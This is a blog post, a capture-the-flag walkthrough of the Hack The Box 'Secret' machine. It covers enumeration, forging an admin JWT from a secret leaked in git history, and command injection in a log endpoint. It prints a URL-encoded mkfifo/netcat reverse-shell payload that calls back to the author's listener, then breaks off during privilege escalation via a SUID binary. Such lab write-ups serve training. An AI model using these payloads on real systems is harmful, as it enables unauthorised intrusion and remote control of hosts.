<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>
        Secret -- HTB walkthrough ::
        Werz — CyberSecurity
      </title>
    
    <head>
  
<script async src="https://www.googletagmanager.com/gtag/js?id=G-R2DLLBQDPX"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-R2DLLBQDPX', { 'anonymize_ip': false });
}
</script>


</head>

<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta
  name="description"
  content="The official box page on HTB #  The writeup: #  System Scan | IP: 10.10.11.120 #  lets add the ip to to the /etc/hosts file and name it secret.htb
 echo &#39;10.10.11.120 secret.htb &#39; &amp;gt;&amp;gt; /etc/hosts
 startup nmap scan | -sC for the default set of scripts. | -sV for Enables version detection. | -T4 for sending the traffic fast.
 nmap -sC -sV -T4 10.10.11.120"
/>

<meta
  name="keywords"
  content="ctf, hackthebox, writeup, htb writeup, walkthrough, retired htb, hack the box, cybersecurtiy, capture the flag"
/>
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://0xwerz.github.io/30/10/2021/secret/" />
<meta content="Posts about Cybersecurity, Pentesting, CTF writeups, and more" property="og:description" />
<meta content="https://0xwerz.github.io/" property="og:url" />
<meta content="Werz         Cybersecurity content, And more" property="og:title" />





<link rel="stylesheet" href="https://0xwerz.github.io/assets/style.css" />

<link rel="stylesheet" href="https://0xwerz.github.io/style.css" />


<link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
<link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png%20%7c%20absURL">
<link rel="icon" type="image/png" sizes="32x32" href="img/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="img//android-chrome-192x192.png">
<link rel="manifest" href="img/site.webmanifest">
<link rel="mask-icon" href="img/safari-pinned-tab.svg" color="#5bbad5">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="theme-color" content="#ffffff">


<link href="https://0xwerz.github.io/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://0xwerz.github.io/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://0xwerz.github.io/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://0xwerz.github.io/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://0xwerz.github.io/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://0xwerz.github.io/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Secret -- HTB walkthrough"/>
<meta name="twitter:description" content="https://app.hackthebox.com/machines/secret"/>



<meta property="og:title" content="Secret -- HTB walkthrough" />
<meta property="og:description" content="https://app.hackthebox.com/machines/secret" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://0xwerz.github.io/30/10/2021/secret/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-10-30T06:29:07+13:00" />
<meta property="article:modified_time" content="2021-10-30T06:29:07+13:00" /><meta property="og:site_name" content="Werz" />






  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a
  href="https://0xwerz.github.io/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >werz@blog:~$</span
    >
    <span class="logo__cursor"></span>
  
</a>
    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/archive">./archive</a></li>
        
      
        
          <li><a href="/posts">./articles</a></li>
        
      
        
          <li><a href="/about">./whoami</a></li>
        
      
      
      
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/archive">./archive</a></li>
      
    
      
        <li><a href="/posts">./articles</a></li>
      
    
      
        <li><a href="/about">./whoami</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none" />
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg
  class="theme-toggler"
  width="24"
  height="24"
  viewBox="0 0 48 48"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
  />
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h1 class="post-title">Secret &ndash; HTB walkthrough</h1>
    <div class="post-meta">
      
        <span class="post-date">
          2021-10-30
        </span>

        
          
        
      

      


      
        <span class="post-read-time"
          >— 9 min read</span
        >
      
    </div>

    
      <span class="post-tags">
        
          <a href="https://0xwerz.github.io/tags/htb/">#htb</a>&nbsp;
        
          <a href="https://0xwerz.github.io/tags/linux/">#linux</a>&nbsp;
        
          <a href="https://0xwerz.github.io/tags/easy/">#easy</a>&nbsp;
        
          <a href="https://0xwerz.github.io/tags/retired/">#retired</a>&nbsp;
        
      </span>
    

    

    <div class="post-content">
      
      The official <h3 id="the-official-box-pagehttpsapphacktheboxcommachinessecret-on-htb">
  <a href="https://app.hackthebox.com/machines/Secret" target="_blank">box page</a>
 on HTB
  <a href="#the-official-box-pagehttpsapphacktheboxcommachinessecret-on-htb" class="h-anchor" aria-hidden="true">#</a>
</h3>
<img src="https://github.com/0xWerz/CTF-writeups/raw/main/HTB/Machines/secret/img/Secret.png" style="border-radius: 3%;" alt="">
<h3 id="the-writeup">
  The writeup:
  <a href="#the-writeup" class="h-anchor" aria-hidden="true">#</a>
</h3>
<h4 id="system-scan--ip-101011120">
  System Scan | <strong>IP: 10.10.11.120</strong>
  <a href="#system-scan--ip-101011120" class="h-anchor" aria-hidden="true">#</a>
</h4>
<p>lets add the ip to to the <code>/etc/hosts</code> file and name it <code>secret.htb</code></p>
<blockquote>
<p><code>echo '10.10.11.120    secret.htb ' &gt;&gt; /etc/hosts</code></p>
</blockquote>
<p>startup nmap scan | <strong>-sC for the default set of scripts</strong>. | <strong>-sV for Enables version detection</strong>. | <strong>-T4 for sending the traffic fast</strong>.</p>
<blockquote>
<p><code>nmap -sC -sV -T4 10.10.11.120</code></p>
</blockquote>
<h2 id="open-ports">
  Open Ports
  <a href="#open-ports" class="h-anchor" aria-hidden="true">#</a>
</h2>
<table>
<thead>
<tr>
<th>Ports</th>
<th>Service</th>
<th>Takeaways</th>
</tr>
</thead>
<tbody>
<tr>
<td>22</td>
<td>SSH</td>
<td>OpenSSH 8.2p1</td>
</tr>
<tr>
<td>80</td>
<td>HTTP</td>
<td>nginx 1.18.0</td>
</tr>
<tr>
<td>3000</td>
<td>HTTP</td>
<td>Node.js</td>
</tr>
</tbody>
</table>
<p>Looks like we got a two webservers running with the same <strong>http title</strong> kinda sus</p>
<h4 id="enumeration--ngnix">
  Enumeration | ngnix
  <a href="#enumeration--ngnix" class="h-anchor" aria-hidden="true">#</a>
</h4>
<p>I will use <code>gobuster</code> with <a href="https://github.com/danielmiessler/SecLists" target="_blank">SecLists</a>
 wordlists to run the URL bruteforce</p>
<blockquote>
<p><code>gobuster dir -u http://secret.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt | tee web-enum.txt</code></p>
</blockquote>
<p><img src="https://i.postimg.cc/2yTwYm01/gobuster.png" alt="alt text"></p>
<h3 id="directories-dumped">
  Directories dumped
  <a href="#directories-dumped" class="h-anchor" aria-hidden="true">#</a>
</h3>
<table>
<thead>
<tr>
<th>Dirs</th>
</tr>
</thead>
<tbody>
<tr>
<td>/download</td>
</tr>
<tr>
<td>/assets</td>
</tr>
<tr>
<td>/api</td>
</tr>
<tr>
<td>/docs</td>
</tr>
</tbody>
</table>
<h3 id="manual-enumeration">
  Manual Enumeration
  <a href="#manual-enumeration" class="h-anchor" aria-hidden="true">#</a>
</h3>
<p>The webpage gives us out it source code like an opensource project, so lets download it and unzip it <code>unzip files.zip</code>. The directory listing looks like it a git repo.
in my case its confirmed by <a href="https://github.com/ohmyzsh/ohmyzsh" target="_blank">ohmyzsh</a>
 shell.
<img src="https://i.postimg.cc/4xQMW7kg/oh-my-zsh.png" alt="alt text"></p>
<p>so let&rsquo;s check <code>/routes/auth.js</code> we can see there is the <code>/register</code> endpoint to register a <strong>user</strong> so lets try sending a <strong>POST</strong> requests maybe are allowed</p>
<p><img src="https://i.postimg.cc/Ss6DxHSp/Screenshot-20220309-151827.png" alt="alt text"></p>
<p>looks like a valid request, and it excepting some data <strong>name,email,password</strong>.
its also defined at /local-web/<strong>validations.js</strong> file
and we can see that login endpoint generate a <strong>JWT</strong> token.</p>
<p><img src="https://i.postimg.cc/85GPvrSr/Screenshot-20220309-152841.png" alt="alt text"></p>
<p>and its get verified on <code>/routes/verifytoken.js</code> file</p>
<p>there is a <code>token secret</code> on the <code>.env</code> file. interesting</p>
<h3 id="git-dump-enumeration">
  Git Dump Enumeration
  <a href="#git-dump-enumeration" class="h-anchor" aria-hidden="true">#</a>
</h3>
<p>I will use git <a href="https://github.com/internetwache/GitTools" target="_blank">extractor</a>
 tool to extract everything from the git archives</p>
<blockquote>
<p><code>~/Downloads/GitTools/GitTools/Extractor/extractor.sh local-web/ dump</code></p>
</blockquote>
<p>lets dump what we&rsquo;ve got.</p>
<p><img src="https://i.postimg.cc/YSQttNPm/image.png" alt="alt text">
so now we have the secret token</p>
<h3 id="registering">
  Registering
  <a href="#registering" class="h-anchor" aria-hidden="true">#</a>
</h3>
<p>I&rsquo;ll try to request a token
first lets creating an account i used the following</p>
<blockquote>
<p><code>curl -X POST -H 'Content-Type: application/json' -v http://secret.htb/api/user/register --data '{&quot;name&quot;: &quot;samiretsamira&quot;,&quot;email&quot;: &quot;samir@samir.com&quot;,&quot;password&quot;: &quot;samiretsamira&quot;}'</code></p>
</blockquote>
<p><img src="https://i.postimg.cc/DZF6NFsb/image.png" alt="alt text">
now lets login for login we know there we need to send just email and password <strong>validation.js</strong></p>
<p><img src="https://i.postimg.cc/909GXnGj/image.png" alt="alt text"></p>
<p>we are in and we&rsquo;ve got our token.
lets check <code>verifytoken.js</code> to gets how the JWT tokens get validates</p>
<p><img src="https://i.postimg.cc/63vkwB16/Screenshot-20220309-161052.png" alt="alt text"></p>
<p>pretty obvious we just have to pass it as a <code>auth-token</code> header</p>
<p>lets send it to <strong>/api/priv</strong> endpoint which kinda tells you if you are admin or not</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl http://secret.htb/api/priv -H <span style="color:#e6db74">&#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjI4YzMxYWFjYmMwZDA0NWNlM2QwMzkiLCJuYW1lIjoic2FtaXJldHNhbWlyYSIsImVtYWlsIjoic2FtaXJAc2FtaXIuY29tIiwiaWF0IjoxNjQ2ODM4ODY4fQ.zev_s--8rCeO10TD6M5bcpv5e0LKsMpVLCox67n0xJg&#39;</span> 
<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;role&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;role&#34;</span>:<span style="color:#e6db74">&#34;you are normal user&#34;</span>,<span style="color:#e6db74">&#34;desc&#34;</span>:<span style="color:#e6db74">&#34;samiretsamira&#34;</span><span style="color:#f92672">}}</span>% 
</code></pre></div><p>ok, we are not admin, but we have the secret so we can made a token for the admin
so its basically checks if <strong>name ==&lsquo;admin&rsquo;</strong> if <strong>true</strong> its returns is it to us</p>
<p>I&rsquo;ll decode my token that the site generated and find out how its made.
I will use <a href="https://github.com/ticarpi/jwt_tool" target="_blank">JWT</a>
 tool you can u what ever you want</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 jwt_tool.py <span style="color:#e6db74">&#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjI4YzMxYWFjYmMwZDA0NWNlM2QwMzkiLCJuYW1lIjoic2FtaXJldHNhbWlyYSIsImVtYWlsIjoic2FtaXJAc2FtaXIuY29tIiwiaWF0IjoxNjQ2ODM4ODY4fQ.zev_s--8rCeO10TD6M5bcpv5e0LKsMpVLCox67n0xJg&#39;</span>

        <span style="color:#ae81ff">\ </span>  <span style="color:#ae81ff">\ </span>       <span style="color:#ae81ff">\ </span>        <span style="color:#ae81ff">\ </span>         <span style="color:#ae81ff">\ </span>                   <span style="color:#ae81ff">\ </span>
   <span style="color:#ae81ff">\_</span>_   |   |  <span style="color:#ae81ff">\ </span>    |<span style="color:#ae81ff">\_</span>_    __| <span style="color:#ae81ff">\_</span>_    __|                    |
         |   |   <span style="color:#ae81ff">\ </span>   |      |          |       <span style="color:#ae81ff">\ </span>        <span style="color:#ae81ff">\ </span>    |
         |        <span style="color:#ae81ff">\ </span>  |      |          |    __  <span style="color:#ae81ff">\ </span>    __  <span style="color:#ae81ff">\ </span>   |
  <span style="color:#ae81ff">\ </span>     |      _     |      |          |   |     |   |     |   |
   |     |     / <span style="color:#ae81ff">\ </span>   |      |          |   |     |   |     |   |
<span style="color:#ae81ff">\ </span>       |    /   <span style="color:#ae81ff">\ </span>  |      |          |<span style="color:#ae81ff">\ </span>       |<span style="color:#ae81ff">\ </span>       |   |
 <span style="color:#ae81ff">\_</span>_____/ <span style="color:#ae81ff">\_</span>_/     <span style="color:#ae81ff">\_</span>_|   <span style="color:#ae81ff">\_</span>_|      <span style="color:#ae81ff">\_</span>_| <span style="color:#ae81ff">\_</span>_____/  <span style="color:#ae81ff">\_</span>_____/ <span style="color:#ae81ff">\_</span>_|
 Version 2.2.5                <span style="color:#ae81ff">\_</span>_____|             @ticarpi      

Original JWT: 

<span style="color:#f92672">=====================</span>
Decoded Token Values:
<span style="color:#f92672">=====================</span>

Token header values:
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> alg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;HS256&#34;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> typ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;JWT&#34;</span>

Token payload values:
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> _id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;6228c31aacbc0d045ce3d039&#34;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;samiretsamira&#34;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> email <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;samir@samir.com&#34;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> iat <span style="color:#f92672">=</span> 1646838868    <span style="color:#f92672">==</span>&gt; TIMESTAMP <span style="color:#f92672">=</span> 2022-03-09 16:14:28 <span style="color:#f92672">(</span>UTC<span style="color:#f92672">)</span>

----------------------
JWT common timestamps:
iat <span style="color:#f92672">=</span> IssuedAt
exp <span style="color:#f92672">=</span> Expires
nbf <span style="color:#f92672">=</span> NotBefore
----------------------

</code></pre></div><h3 id="token-swapping">
  Token Swapping
  <a href="#token-swapping" class="h-anchor" aria-hidden="true">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 jwt_tool.py -I -S hs256 -pc <span style="color:#e6db74">&#39;name&#39;</span> -pv <span style="color:#e6db74">&#39;theadmin&#39;</span> -p <span style="color:#e6db74">&#39;gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE&#39;</span> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjI4YzMxYWFjYmMwZDA0NWNlM2QwMzkiLCJuYW1lIjoic2FtaXJldHNhbWlyYSIsImVtYWlsIjoic2FtaXJAc2FtaXIuY29tIiwiaWF0IjoxNjQ2ODQxNzkwfQ.y5yhZ_3VE1Hlb5DG9VWExWrRTEAuYLPT58f0bdZklPo

        <span style="color:#ae81ff">\ </span>  <span style="color:#ae81ff">\ </span>       <span style="color:#ae81ff">\ </span>        <span style="color:#ae81ff">\ </span>         <span style="color:#ae81ff">\ </span>                   <span style="color:#ae81ff">\ </span>
   <span style="color:#ae81ff">\_</span>_   |   |  <span style="color:#ae81ff">\ </span>    |<span style="color:#ae81ff">\_</span>_    __| <span style="color:#ae81ff">\_</span>_    __|                    |
         |   |   <span style="color:#ae81ff">\ </span>   |      |          |       <span style="color:#ae81ff">\ </span>        <span style="color:#ae81ff">\ </span>    |
         |        <span style="color:#ae81ff">\ </span>  |      |          |    __  <span style="color:#ae81ff">\ </span>    __  <span style="color:#ae81ff">\ </span>   |
  <span style="color:#ae81ff">\ </span>     |      _     |      |          |   |     |   |     |   |
   |     |     / <span style="color:#ae81ff">\ </span>   |      |          |   |     |   |     |   |
<span style="color:#ae81ff">\ </span>       |    /   <span style="color:#ae81ff">\ </span>  |      |          |<span style="color:#ae81ff">\ </span>       |<span style="color:#ae81ff">\ </span>       |   |
 <span style="color:#ae81ff">\_</span>_____/ <span style="color:#ae81ff">\_</span>_/     <span style="color:#ae81ff">\_</span>_|   <span style="color:#ae81ff">\_</span>_|      <span style="color:#ae81ff">\_</span>_| <span style="color:#ae81ff">\_</span>_____/  <span style="color:#ae81ff">\_</span>_____/ <span style="color:#ae81ff">\_</span>_|
 Version 2.2.5                <span style="color:#ae81ff">\_</span>_____|             @ticarpi      

Original JWT: 

jwttool_164927ec073ab3e068fd9c8654d34859 - Tampered token - HMAC Signing:
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span>  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjI4YzMxYWFjYmMwZDA0NWNlM2QwMzkiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InNhbWlyQHNhbWlyLmNvbSIsImlhdCI6MTY0Njg0MTc5MH0.4o15P7IKPOeId7l1f0htmGhMrPsDkAak8Mi_pxahAuQ
</code></pre></div><p>Now we got the <code>theadmin</code> token let&rsquo;s verify it at <strong>/api/priv</strong> endpoint</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl http://secret.htb/api/priv -H <span style="color:#e6db74">&#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjI4YzMxYWFjYmMwZDA0NWNlM2QwMzkiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InNhbWlyQHNhbWlyLmNvbSIsImlhdCI6MTY0Njg0MTc5MH0.4o15P7IKPOeId7l1f0htmGhMrPsDkAak8Mi_pxahAuQ&#39;</span>

<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;creds&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;role&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;theadmin&#34;</span>,<span style="color:#e6db74">&#34;desc&#34;</span>:<span style="color:#e6db74">&#34;welcome back admin&#34;</span><span style="color:#f92672">}}</span>% 
</code></pre></div><p>we are admin now!</p>
<p>lets try look at log directories, as we can notice in <strong>/routes/private.js</strong> its allowed for admin</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#39;http://secret.htb/api/logs\?file\=/etc/passwd&#39;</span> -H <span style="color:#e6db74">&#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjI4YzMxYWFjYmMwZDA0NWNlM2QwMzkiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InNhbWlyQHNhbWlyLmNvbSIsImlhdCI6MTY0Njg0MTc5MH0.4o15P7IKPOeId7l1f0htmGhMrPsDkAak8Mi_pxahAuQ&#39;</span> <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;killed&#34;</span>:false,<span style="color:#e6db74">&#34;code&#34;</span>:128,<span style="color:#e6db74">&#34;signal&#34;</span>:null,<span style="color:#e6db74">&#34;cmd&#34;</span>:<span style="color:#e6db74">&#34;git log --oneline /etc/passwd&#34;</span><span style="color:#f92672">}{</span><span style="color:#e6db74">&#34;killed&#34;</span>:false,<span style="color:#e6db74">&#34;code&#34;</span>:128,<span style="color:#e6db74">&#34;signal&#34;</span>:null,<span style="color:#e6db74">&#34;cmd&#34;</span>:<span style="color:#e6db74">&#34;git log --oneline whoami&#34;</span><span style="color:#f92672">}</span>
</code></pre></div><p>Looks like it&rsquo;s a comand injection.</p>
<h3 id="exploitation">
  Exploitation
  <a href="#exploitation" class="h-anchor" aria-hidden="true">#</a>
</h3>
<p>so  let&rsquo;s get a rev shell.
I will just use <strong>cURL</strong> command line so i need to <strong>URL-Encode</strong> for the payload, you can use <a href="https://portswigger.net/burp/communitydownload" target="_blank">burpsuite</a>
 or whatever you want.
<strong>(we can just upload a generated ssh public key and get a ssh shell)</strong>
i love doing it with the OGs way o:</p>
<p>launch a netcat (<strong>nc</strong>) listening port</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -lvnp <span style="color:#ae81ff">4444</span> 
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
</code></pre></div><p><strong>payload:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc YOUR IP PORT &gt;/tmp/f
</code></pre></div><p><strong>URL-encoded:</strong> encoded with <a href="https://www.urlencoder.org/" target="_blank">urlencoder</a>
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.15.158%204444%20%3E%2Ftmp%2Ff
</code></pre></div><p><strong>Final payload form</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#39;http://secret.htb/api/logs?file=;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.15.158%204444%20%3E%2Ftmp%2Ff&#39;</span> -H <span style="color:#e6db74">&#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjI4YzMxYWFjYmMwZDA0NWNlM2QwMzkiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InNhbWlyQHNhbWlyLmNvbSIsImlhdCI6MTY0Njg0MTc5MH0.4o15P7IKPOeId7l1f0htmGhMrPsDkAak8Mi_pxahAuQ&#39;</span>
</code></pre></div><p>yes! we are in with the user flag <strong>home/dasith/flag.txt</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -lvnp <span style="color:#ae81ff">4444</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
connect to <span style="color:#f92672">[</span>10.10.15.158<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.11.120<span style="color:#f92672">]</span> <span style="color:#ae81ff">38594</span>
</code></pre></div><p>first lets spaw a stabilized shell</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">export TERM<span style="color:#f92672">=</span>xterm
</code></pre></div><p>get the user flag</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat /home/dasith/user.txt
</code></pre></div><h2 id="root-privilege">
  root privilege
  <a href="#root-privilege" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>after sometime iv found the <strong>/opt</strong> with a <strong>C</strong> program that count looks like kinda same  as <strong>wc</strong> command</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ls -la
total <span style="color:#ae81ff">56</span>
drwxr-xr-x  <span style="color:#ae81ff">2</span> root root  <span style="color:#ae81ff">4096</span> Oct  <span style="color:#ae81ff">7</span> 10:06 .
drwxr-xr-x <span style="color:#ae81ff">20</span> root root  <span style="color:#ae81ff">4096</span> Oct  <span style="color:#ae81ff">7</span> 15:01 ..
-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">3736</span> Oct  <span style="color:#ae81ff">7</span> 10:01 code.c
-rw-r--r--  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">16384</span> Oct  <span style="color:#ae81ff">7</span> 10:01 .code.c.swp
-rwsr-xr-x  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">17824</span> Oct  <span style="color:#ae81ff">7</span> 10:03 count
-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">4622</span> Oct  <span style="color:#ae81ff">7</span> 10:04 valgrind.log
</code></pre></div><p>The files are owned by <strong>root</strong> interesting..</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./count
Enter source file/directory name:/root
</code></pre></div><p>its says enter a <strong>file or a directory</strong>, when i type <strong>/root</strong> its listing it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">-rw-r--r--	.viminfo
-rw-r--r--	everyone_needs_love.txt
drwxr-xr-x	..
-rw-r--r--	.bashrc
drwxr-xr-x	.local
drwxr-xr-x	snap
lrwxrwxrwx	.bash_history
drwx------	.config
drwxr-xr-x	.pm2
-rw-r--r--	.profile
drwxr-xr-x	.vim
drwx------	.
drwx------	.cache
-r--------	root.txt
drwxr-xr-x	.npm
drwx------	.ssh

Total entries       <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>
Regular files       <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>
Directories         <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>
Symbolic links      <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
Save results a file? <span style="color:#f92672">[</span>y/N<span style="color:#f92672">]</span>:
</code></pre></div><p>after that it asks for saving the results to a file, so i thought about <strong>Leveraging Core Dump</strong> idk why lol.</p>
<p>but i need a more stabilazed shell because i need to but the program in a bg prosess nvm, ill spawn a ssh shelll.</p>
<p>just generate a ssh public key in your machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">➜  secret ssh-keygen                                                
Generating public/private rsa key pair.
Enter file in which to save the key <span style="color:#f92672">(</span>/home/user/.ssh/id_rsa<span style="color:#f92672">)</span>: 
/home/werz/.ssh/id_rsa already exists.
Overwrite <span style="color:#f92672">(</span>y/n<span style="color:#f92672">)</span>? 
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">secret cat /home/werz/.ssh/id_rsa.pub             
